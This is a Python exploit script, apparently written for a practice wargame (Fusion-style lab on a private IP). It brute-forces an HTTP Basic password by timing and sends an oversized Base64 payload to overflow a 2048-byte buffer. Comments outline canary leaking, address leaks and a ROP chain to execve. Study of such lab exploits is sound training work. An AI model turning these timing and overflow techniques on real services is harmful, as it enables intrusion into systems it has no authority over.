PORT = 20004
FUSION_IP = "192.168.180.128"
import socket
import string
import telnetlib
import struct
import time
import select
import hmac
import threading

from collections import OrderedDict
q = lambda x: struct.pack('<I', x)

### ATTACK IDEA
### 1. BF OVER PASSWORD USING TIMING ATTACK V
### todo: find infomration leakage vulnerability
### 2. LEAK STACK CANARY v
### 3. LEAK LIBC v
### 4. LEAK HEAP v
### 5. LEAK MODULE addr v
### use ROP to call libc.execve() with our params
### 6. use Base64 decode vulnerability (output length is set to be input_length / 4 * 3 ) while buffer is 2048 bytes long and input data is in our control! V
### 		after leaking stack canary and exploit the vuln we control EIP. 


### vulns:
	### Base64decode let's us exceed the 2048 buffer length :)
	###  they set *output_length = input_length / 4 * 3;
	### although it points to a 2048 sized buffer.
	### we need to start with the correct bypass to get to the return...

### XXX strencode
	### takes not alpha charactes and switch them to %xx format.
	### makes strings larger *3

	### can't take advantage of that since sizes are being checked
	### + inorder to get to the function need to be a valid dir
	### meaning going at least one dir on the system
	### couldn't find a way to do that since .. is being checked!

### LEAKAGE IDEAs:
	### 1. blind -> using not BASE64CHARS and counting time...
	### if I get lucky I will be able to know a several bytes from uninitiallize heap data...
	### since I have 256 bytes which 64 of them are allocated... so 192 uninitiallized bytes...
	### each of them can be compared to a byte from the password I've got 16 of them... 
	### 15 unique on avarage... 
	### the chance of a colission between 192 (7.584) to 15 (3.9068) is ~ log(192, 2) + log(15, 2) - log(256, 2) => 3.491853096329674 ~ 3.5 bytes!

	### This IDEA is rather stupid and not good enough...
	### Leakage is by timing attack :(

	### 2. Better IDEA:
	### trying guessing the stack cookie byte by byte :)
	### since this is a fork server it doesn't changes ...
	### I don't crash the server since it is being forked :)


	### 3. Best IDEA:
	### getting the stack smashing detected message fully
	### it contains libc addr + heap + stack + binary :)
	### we need to fail at stack cookie and not crash afterwards :)
	### being able to create a stable crash :)





TIMES = {999: '!'}
THREADS = []

def try_password(password, times = 1):

	total_time = 0
	for i in xrange(times):
		s = socket.socket()
		s.connect((FUSION_IP, PORT))
		HTTP_DATA = """\
		GET / HTTP/1.1
		Authorization: Basic {base64}

		""".format(base64=("{password}".format(password=password)).encode('base64')).replace('\t','')

		#print repr(HTTP_DATA)
		s.send(HTTP_DATA)
		t = time.clock()
		calc_time = 999
		#if select.select([s], [], [], 1)[0]:
		data = s.recv(4096)
		total_time += time.clock() - t
		if total_time > min(TIMES):
			total_time = 999
			break

	TIMES[total_time] = password
	return total_time

def bf_password():
	global TIMES
	strip = string.lowercase + string.uppercase + string.digits
	guessed_passwd = ''

	for x in xrange(16):
		for a in strip:
			try_password(guessed_passwd + a, 1)

		best_char = TIMES[min(TIMES.keys())]
		guessed_passwd = best_char
		TIMES = {999: '!'}
		print guessed_passwd

	return guessed_passwd



password = "QPBxP72dVaBaW74v".encode('base64') #bf_password()
password = "QPBxP72dVaBaW74v".encode('base64').replace('=','').replace('\n','') + ("A" * 2760) + "==\n"
print len(password), len(password) % 4
s = socket.socket()
s.connect((FUSION_IP, PORT))
HTTP_DATA = """\
GET / HTTP/1.1
Authorization: Basic {base64} 

""".format(filename='\x01' * 9000, base64=("{password}".format(password=password)).replace('\t',''))
s.send(HTTP_DATA)

print s.recv(4096),
print s.recv(4096)

s.close()